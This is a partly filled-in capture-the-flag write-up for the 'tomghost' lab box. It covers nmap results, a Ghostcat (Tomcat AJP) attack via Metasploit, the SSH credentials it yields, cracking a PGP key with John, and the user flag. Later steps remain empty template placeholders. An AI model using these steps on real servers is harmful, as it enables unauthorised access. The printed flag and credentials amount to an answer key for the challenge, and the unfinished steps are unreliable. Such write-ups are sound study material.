---
type: {notes/writeup}
tags: [{PLATFORM NAME/CTF NAME}, {box/challenge}, {linux/win}, {easy/medium/hard}, {services}, {cve-number}, {tooling}, {techniques}]
reference: {URL}
category: {blackbox/web/rev-engineering/rooting/coding/hardware/blockchain/misc/steg/etc}
title: "{BOX NAME}"
difficulty: {easy, medium, hard}
user-voted: {easy, medium, hard}
date: {YYYY-MM-DD}
author: {AUTHOR NAME}
contact: {AUTHOR CONTACT}
---

# tomghost

Target IP = http://10.10.138.176
Tun0 IP = 10.6.15.244

---

## Information Gathering

### Open Ports & Running Services

```sh
nmap -sC -sV 10.10.138.176 -v
```

**OS:** {Linux/Win}

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Exploitation

https://www.exploit-db.com/exploits/49039
found this exploit on exploit-db related to the apache tomcat version in question

### {Step1}

Tooling: Metasploit
Description: extract credentials

```sh
msfconsole
search ghostcat 
options 
set rhost 
run
```

skyfuck:8730281lkjlkjdqlksalks
These are the ssh credentials I obtained from the metasploit script

---

### {Step2}

Tooling: John/gpg2john
Description: crack located secret pgp key 

```sh
gpg2john key.asc > hash
john -wordlist=/usr/share/wordlists/rockyou.txt hash
```

these are the credentials aquired by john 
alexandru        (tryhackme) 

---

> [!USER FLAG]
> {USER FLAG}

{SCREENSHOT}

---


### {Step#3}

Tooling: browsing shell
Description: find user.txt flag

```sh
cd ../
ls
cd merlin
ls
cat user.txt
```

THM{GhostCat_1s_so_cr4sy}
flag obtained from the user.txt file


---

### {Step#4}

Tooling: gain access to merlin
Description: {GOALS}

```sh
{COMMAND}

```
/usr/share/dns/root.key
/usr/share/man/man7/credentials.7.gz

---

> [!ROOT FLAG]  
> {ROOT FLAG}  

{SCREENSHOT}

---

## SUCCESS

---

### Conclusion

{SCREENSHOT FINAL SCREEN}

---

## TODO

[ ] Share on Twitter  
[ ] Revise notes + Links to Notebook  
[ ] Export to HTML  
[ ] Publish on Medium  
[ ] Convert to PDF  
[ ] Push on GitHub  